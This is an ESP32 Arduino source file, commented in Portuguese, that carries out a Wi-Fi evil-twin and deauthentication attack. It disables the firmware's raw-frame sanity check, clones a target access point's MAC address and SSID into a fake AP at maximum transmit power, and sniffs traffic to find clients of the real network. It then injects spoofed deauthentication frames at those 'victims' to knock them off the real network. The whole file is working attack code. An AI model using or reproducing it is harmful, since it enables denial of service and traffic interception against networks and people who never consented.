#include "funcoes_evtw.h"

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0; 
}

volatile bool precisa_derrubar = false;
uint8_t mac_vitima[6];
unsigned long ultimo_deauth = 0; 

bool estaConectadoNoMeuAp(uint8_t* mac) {
    wifi_sta_list_t station_list;
    if (esp_wifi_ap_get_sta_list(&station_list) == ESP_OK) {
        for (int i = 0; i < station_list.num; i++) {
            if (memcmp(station_list.sta[i].mac, mac, 6) == 0) return true; 
        }
    }
    return false;
}

void IRAM_ATTR sniffer_callback_agressivo(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_DATA) return;

    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    int len = pkt->rx_ctrl.sig_len;
    uint8_t *payload = pkt->payload;

    if (len < 24) return;

    uint8_t* mac_destino = &payload[4];
    uint8_t* mac_origem = &payload[10];

    if (memcmp(mac_destino, bssid_alvo, 6) == 0 && (mac_origem[0] & 0x01) == 0) {
        if (!estaConectadoNoMeuAp(mac_origem)) {
            memcpy(mac_vitima, mac_origem, 6);
            precisa_derrubar = true;
        }
    }
}

void configurarDeauth() {
    Serial.println("Iniciando AP Falso e Sniffer...");
    
    WiFi.disconnect(true);
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);
    delay(500); 

    // Tenta clonar o MAC (se falhar, segue em frente)
    if (esp_wifi_set_mac(WIFI_IF_AP, bssid_alvo) != ESP_OK) {
        Serial.println(">> AVISO: MAC nao clonado (pode exigir acao do usuario).");
    }

    WiFi.mode(WIFI_AP_STA);
    delay(200);
    
    bool ap_ok = WiFi.softAP(SSID_ALVO, SENHA_REAL, canal_alvo, 0, 4);
    if (ap_ok) Serial.println(">> [SUCESSO] AP Falso no ar!");
    
    esp_wifi_set_bandwidth(WIFI_IF_AP, WIFI_BW_HT20);
    esp_wifi_set_max_tx_power(84); 

    esp_wifi_set_promiscuous_rx_cb(&sniffer_callback_agressivo);
    esp_wifi_set_promiscuous(true);
}

void loopDeauth() {
    if (precisa_derrubar) {
        precisa_derrubar = false;
        if (millis() - ultimo_deauth > 1000) {
            uint8_t deauth_frame[26] = {
                0xC0, 0x00, 0x00, 0x00,
                mac_vitima[0], mac_vitima[1], mac_vitima[2], mac_vitima[3], mac_vitima[4], mac_vitima[5],
                bssid_alvo[0], bssid_alvo[1], bssid_alvo[2], bssid_alvo[3], bssid_alvo[4], bssid_alvo[5],
                bssid_alvo[0], bssid_alvo[1], bssid_alvo[2], bssid_alvo[3], bssid_alvo[4], bssid_alvo[5],
                0xF0, 0xFF, 0x07, 0x00 
            };
            esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
            Serial.print("[Deauth] Vitima derrubada.\n");
            ultimo_deauth = millis();
        }
    }
}